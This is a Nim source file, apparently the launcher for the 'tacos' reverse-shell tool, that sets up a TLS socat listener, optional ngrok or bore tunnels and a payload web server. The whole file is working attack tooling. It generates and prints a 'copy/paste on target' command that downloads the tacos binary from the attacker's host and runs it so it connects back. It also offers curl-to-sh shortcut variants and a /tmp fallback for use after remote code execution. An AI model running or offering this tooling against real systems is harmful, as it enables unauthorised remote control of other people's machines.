import os
import osproc
import strutils
import sequtils, random
import strformat
import terminal



const TACOS_DIRPATH: string = getHomeDir()&".tacos/"
const PTY4ALL: string = TACOS_DIRPATH&"light-pty4all/"

proc randomStr():string=
    randomize()
    const lowerCaseAscii = 97..122
    let myRandom = 8.newSeqWith(lowerCaseAscii.rand.char).join
    return myRandom

type EKeyboardInterrupt = object of CatchableError
proc handlerCtrlC() {.noconv.} =
  raise newException(EKeyboardInterrupt, "Keyboard Interrupt")

setControlCHook(handlerCtrlC)

proc cleanup():void =
    styledEcho(fgGreen,"[+] ",fgDefault,"perform clean up before exit 🧹")
    removeFile("server.crt")
    removeFile("server.key")
    removeFile("server.pem")
    removeFile("sh")
    removeFile("socat-forker.sh")
    removeFile("socat-forker-windows.sh")
    removeFile("tacos")
    #removeFile(getAppFilename()) # not needed if wrap in path

proc Wrap(
  bore = false, 
  ngrok = false,
  lhost ="", 
  lport = 4444, 
  webport=9292, 
  gitar = true,
  windows=false,
  tmp=false,
  noShortcut=false
  ): void =
    try:
        ## Ease the launch of socat listener waiting for tacos interactive reverse shell
        #Flag consistency
        if ngrok and bore:
            styledEcho("Conflicting flags ",fgRed,"--ngrok and --bore")
            quit(QuitFailure)
        
        if lport==webport:
            styledEcho("Conflicting flags ",fgRed,"--lport and --webport are equals")
            quit(QuitFailure)
        
        if tmp and windows:
            styledEcho("Conflicting flags ",fgRed,"--tmp and --windows")
            quit(QuitFailure)

        if (bore or ngrok) and lhost!="":
            styledEcho("⚠️ ",fgYellow,"--lhost has been filled but will not be used with --ngrok or --bore flags")
            quit(QuitFailure)

        if not bore and not ngrok and lhost=="":
            styledEcho("Missing params: ",fgRed,"--lhost is missing (or --ngrok, or --bore)")
            quit(QuitFailure)

        ## Tmux
        if not existsEnv("TMUX"):
            styledEcho(fgRed,"[+] ",fgDefault,"Launch wrap in tmux session")
            quit(QuitFailure)
        else:
            styledEcho(fgYellow,"[+] ",fgDefault,"Tmux is running 😋")

        var binary: string
        var script: string
        
        ## Windows
        if windows:
            binary ="tacos.exe"
            script="socat-forker-windows.sh"
        else:
            binary = "tacos"
            script="socat-forker.sh"

        let pwd = getCurrentDir()

        ## TLS
        if fileExists("server.pem"):
            styledEcho(fgYellow,"[+] ",fgDefault,"server.pem already exist, do not generate certificates")
        else:
            styledEcho(fgGreen,"[+] ",fgDefault,"Generate certificates 📜")
            removeFile("server.key")
            removeFile("server.crt")
            let errOpenssl = execCmdEx("yes \"\" | openssl req -newkey rsa:2048 -nodes -keyout server.key -x509 -days 30 -out server.crt").exitCode
            if errOpenssl != 0:
                styledEcho(fgRed,"failed creating certificates with openssl")
                quit(QuitFailure)
            let errPem = execCmdEx("cat server.key server.crt >server.pem").exitCode
            if errPem != 0:
                styledEcho(fgRed,"failed creating server.pem")
                quit(QuitFailure)

        ## copy script
        try:
            copyFileWithPermissions(PTY4ALL&script&".tpl",getCurrentDir()&"/"&script)
            script = fmt"{pwd}/{script}"
            setFilePermissions(script, {fpUserWrite, fpUserRead, fpUserExec})
        except OSError:
            styledEcho(fgRed,"failed copying",PTY4ALL&script,"in",getCurrentDir()&"/"&script)
            quit(QuitFailure)
        
        ## Tunneling launching
        var tunnelEndpoint: string
        if bore:
            styledEcho(fgGreen,"[+] ",fgDefault,"Launch bore tunneling")
            discard execCmd("tmux split-window -v \"bore local " & $webport & " --to bore.pub\"")
            styledEcho(fgCyan,"please enter bore.pub remote_port given?",fgDefault)
            var borePort = readLine(stdin)
            tunnelEndpoint="bore.pub:" & borePort
        elif ngrok:
            styledEcho(fgGreen,"[+] ",fgDefault,"Launch ngrok tunneling")
            discard execCmd("tmux split-window -v \"ngrok tcp " & $webport & "\"")
            sleep 4000
            let ngrokTcp = execCmdEx("curl --silent --show-error http://127.0.0.1:4040/api/tunnels | jq -r \".tunnels[0].public_url\"").output
    
            let ngrokEndpoint = rsplit(ngrokTcp,":")[1 .. 2]
            tunnelEndpoint = rsplit(ngrokEndpoint[0],"/")[^1] & ":" & ngrokEndpoint[1]
            tunnelEndpoint =splitLines(tunnelEndpoint)[0] #withdraw new line

        ## Http Server
        var url,secret:string            
        if gitar:
            styledEcho(fgGreen,"[+] ",fgDefault,"Launch gitar 📡")
            secret = randomStr()
            var gitarCmd: string
            if tunnelEndpoint == "":
                gitarCmd = fmt"gitar -e {lhost} -p {webport} --secret {secret}"
                url = fmt"http://{lhost}:{webport}/{secret}"
            else:
                gitarCmd = fmt"gitar -a https://{tunnelEndpoint} -f {lport} --secret {secret}"
                url = fmt"http://{tunnelEndpoint}/{secret}"
            discard execCmd(fmt"tmux split-window -h '{gitarCmd}'")
            # TODO: handle gitar shortcut (only possible without tunneling)
        else:
            # Forced to be w/o tunneling
            var pythonServerCmd = fmt"python3 -m http.server {webport}"
            url = fmt"http://{lhost}:{webport}"
            discard execCmd(fmt"tmux split-window -h '{pythonServerCmd}'")

        ## Tacos in current directory
        if fileExists("tacos"):
            styledEcho(fgYellow,"[+] ",fgDefault,fmt"tacos is already in {pwd}")
        else:
            styledEcho(fgRed,fmt"Put {binary} in {pwd} before launching reverse shell process")
            echo "press Enter when ok.."
            discard stdin.readLine()

        ## Message output
        styledEcho(fgGreen,"[+] ",fgDefault,"Copy/paste following command on target and enjoy your meal 🌮:")
        var remoteCmd: string
        var downloadUrl = fmt"{url}/pull/{binary}"
        var shutdownUrl = fmt"{url}/shutdown"
                    
        if windows:
            if tunnelEndpoint != "":
                remoteCmd=fmt"curl -O {downloadUrl} &&  curl {shutdownUrl} && .\\{binary} {tunnelEndpoint}"
            else:
                remoteCmd=fmt"curl -O {downloadUrl} && .\\{binary} {lhost}:{lport}"
        else:
            if tunnelEndpoint != "":
                remoteCmd=fmt"curl -s -O {downloadUrl} &&  curl {shutdownUrl} && chmod +x {binary} && ./{binary} {tunnelEndpoint}"
                if tmp:
                    remoteCmd=fmt"mkdir -p /tmp/tacos && curl -s -o /tmp/tacos/{binary} {downloadUrl} &&  curl {shutdownUrl} && chmod +x /tmp/tacos/{binary} && /tmp/tacos/{binary} {tunnelEndpoint}"
            else:
                remoteCmd=fmt"curl -s -O {downloadUrl} && chmod +x {binary} && ./{binary} {lhost}:{lport}"
                if tmp:
                    remoteCmd=fmt"mkdir -p /tmp/tacos && curl -s -o /tmp/tacos/{binary} {downloadUrl} && chmod +x /tmp/tacos/{binary} && /tmp/tacos/{binary} {lhost}:{lport}"


        ## Inject prepared-command within reverse shell
        if tunnelEndpoint == "":
            if not windows and gitar:
                echo "HHHERE"
                discard execCmd(fmt"sed -i 's/GITAR_SECRET/{secret}/g' {script}")
                discard execCmd(fmt"sed -i 's/GITAR_PORT/{webport}/g' {script}")
                discard execCmd(fmt"sed -i 's/GITAR_HOST/{lhost}/g' {script}")
            else:
                discard execCmd(fmt"sed -i '/GITAR_SECRET/d' {script}")

        ## With shorter shortcut
        if not noShortcut:
            writeFile("sh", remoteCmd)
            let shortcutUrl = fmt"{url}/pull/sh"
            remoteCmd = "\nsh -c \"$(curl " & shortcutUrl & ")\"\nsh <(curl " & fmt"{shortcutUrl}" & ")\n" & fmt"curl {shortcutUrl}" & "|sh\n" #Cuuld be cleaner

        echo ""

        ## Socat listener
        if windows:
            echo fmt"(🪟) {remoteCmd}"
            discard execShellCmd(fmt"socat OPENSSL-LISTEN:{lport},cert=server.pem,verify=0,reuseaddr,fork EXEC:{getCurrentDir()}/{script},pty")
        else:
            echo fmt"(🐧) {remoteCmd}"
            discard execShellCmd(fmt"socat OPENSSL-LISTEN:{lport},cert=server.pem,verify=0,reuseaddr,fork EXEC:{script},pty,raw,echo=0")
        cleanUp()
    except EKeyboardInterrupt:
        styledEcho(fgYellow,"Catch Interrupt signal")
        cleanUp()
    
when isMainModule:
  import cligen;  dispatch Wrap, help={"ngrok": "use ngrok to expose listener (can't be used with bore)",
  "bore": "use bore to expose listener",
  "lport": "socat listener local port",
  "webport": "webport",
  "gitar": "use gitar as web server (also enable gitar shortcut on remote). Python server is used otherwise",
  "windows": "target windows machine",
  "tmp": "if RCE is not in a writable repository, store tacos in /tmp/tacos (only for linux)",
  "no-shortcut": "disable /sh endpoint of gitar (use longer command)",
  }